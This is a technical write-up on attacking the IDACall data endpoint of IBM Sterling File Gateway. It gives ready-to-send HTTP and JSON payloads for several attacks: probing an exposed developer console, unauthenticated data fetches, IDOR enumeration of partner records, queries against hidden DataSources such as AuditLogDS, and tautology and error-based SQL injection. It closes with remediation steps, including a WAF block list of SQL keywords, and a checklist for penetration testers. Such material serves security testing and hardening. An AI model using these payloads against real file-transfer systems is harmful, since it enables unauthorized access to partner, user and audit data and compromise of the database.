# Technical Analysis: /filegateway/isomorphic/IDACall
**Target Protocol**: Isomorphic SmartClient RPC / DataSource Gateway
**Subject**: Vulnerability Mechanics, Exploitation Scenarios, and Payloads

## 1. Architecture Overview: What is IDACall?

In IBM Sterling File Gateway, the administrative and partner interfaces utilize the **Isomorphic SmartClient** framework for client-server data synchronization. The `/filegateway/isomorphic/IDACall` servlet acts as a centralized "Data Gateway."

### How it Works:
1.  The UI (browser) sends an **RPCRequest** or **DSRequest** (DataSource Request) to the server.
2.  The server-side `IDACall` servlet parses the request, which identifies a `dataSource` (e.g., `PartnerDS`), an `operationType` (fetch, update, add, remove), and a `data` object (the payload).
3.  The framework automatically maps these to server-side logic (SQL queries, Java DMI, or Hibernate operations).

**Security Risk**: Because this single endpoint handles most of the UI's data interactions, any failure in server-side authorization or input validation can lead to systemic compromise.

---

## 2. Scenario 1: Unauthenticated Attack Surface (Framework Exploitation)

This scenario focuses on exploiting the RPC mechanism without a valid session.

### A. Developer Console Exposure (CVE-2020-9354 Context)
*   **Vulnerability**: Framework administrative tools (e.g., `developerConsoleOperations.jsp`) left enabled in production.
*   **Impact**: Unauthenticated users can view DataSource definitions, test RPCs, and sometimes execute arbitrary Java code if DMI is exposed.
*   **Detection**:
    ```http
    GET /filegateway/isomorphic/system/helpers/developerConsoleOperations.jsp HTTP/1.1
    Host: target-sfg.com
    ```
    *If this returns a `200 OK` or a functional console UI, the system is critically misconfigured.*

### B. Session Token Bypass attempts
*   **Mechanic**: Determining if the `IDACall` servlet properly enforces the `SecurityFilter`. An attacker attempts to call a "Fetch" operation on a sensitive DataSource (like `UserCredentialsDS`) without a `JSESSIONID`.
*   **Burp Suite Payload (Initial Recon)**:
    ```http
    POST /filegateway/isomorphic/IDACall HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    dataSource=UserDS&operationType=fetch&data={"userID": "admin"}
    ```
    *If the server returns data rather than a `302 Redirect` to login, the endpoint is unauthenticated.*

---

## 3. Scenario 2: Authenticated Privilege Escalation & IDOR

This is the most common real-world risk, where a low-privileged user (e.g., a Partner) uses the RPC system to access data belonging to other Partners or Administrators.

### A. Insecure Direct Object Reference (IDOR) via Criteria
*   **Mechanic**: The UI typically restricts what a user can see. However, an attacker can modify the `criteria` in the `IDACall` request to bypass these UI-level filters.
*   **Burp Suite Payload (Partner Hijacking)**:
    ```json
    {
      "dataSource": "PartnerDS",
      "operationType": "fetch",
      "componentId": "partnerGrid",
      "data": {
        "partnerID": "ANY_PARTNER_GUID_HERE"
      }
    }
    ```
    *By iterating through `partnerID` values, an attacker can dump the global partner registry.*

### B. DataSource Hijacking
*   **Mechanic**: Attempting to query DataSources that are not used by the current UI view but exist in the backend (e.g., `AuditLogDS`, `SystemConfigDS`).
*   **Burp Suite Payload**:
    ```json
    {
      "dataSource": "AuditLogDS",
      "operationType": "fetch",
      "data": {}
    }
    ```

---

## 4. Scenario 3: SQL Injection via criteria (CWE-89)

If the server-side DataSource is custom-built and uses string concatenation, it is vulnerable to SQLi.

### A. Tautology Injection
*   **Mechanic**: Injecting boolean logic into a filter field that is passed through the `IDACall` criteria.
*   **Burp Suite Payload**:
    ```json
    {
      "dataSource": "SearchDS",
      "operationType": "fetch",
      "data": {
        "searchField": "' OR 1=1 --"
      }
    }
    ```

### B. Error-Based SQLi
*   **Mechanic**: Injecting syntax-breaking characters to reveal backend database version/schema details.
*   **Burp Suite Payload**:
    ```json
    {
      "dataSource": "FileTransferDS",
      "operationType": "fetch",
      "data": {
        "fileName": "test' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--"
      }
    }
    ```

---

## 5. Remediation & Hardening for IDACall

> [!IMPORTANT]
> **Primary Mitigation**: Implementing **Server-Side Authorization Logic** in every DataSource. Never trust individual IDs or filter criteria sent from the SmartClient UI.

1.  **Operation Bindings**: Use `requiresRole` or `requires` in your `.ds.xml` files to restrict which User Roles can call specific operations (fetch vs update).
2.  **Server-Side Filtering**: Enforce "Owner-Based" filters in the Java code. For example, when a Partner calls `fetch`, the backend should automatically append `AND partnerID = <session_user_id>` to the query.
3.  **Disable Debugging**: Ensure `isc_developerConsole` is set to `false` in your `server.properties` file.
4.  **WAF Virtual Patching**: Block any `IDACall` requests containing SQL keywords (`UNION`, `SELECT`, `--`) in the JSON body.

---

## 6. Summary for Penetration Testers

When testing `/filegateway/isomorphic/IDACall`, utilize Burp Suite's **JSON Beautifier** to observe the structure. Focus on:
1.  **Changing the `dataSource`** to names like `User`, `Config`, `Audit`, or `Log`.
2.  **Modifying `criteria`** to bypass ID restrictions.
3.  **Checking Response Sizes**: A sudden spike in response byte counts often indicates a successful "OR 1=1" injection or data dump.
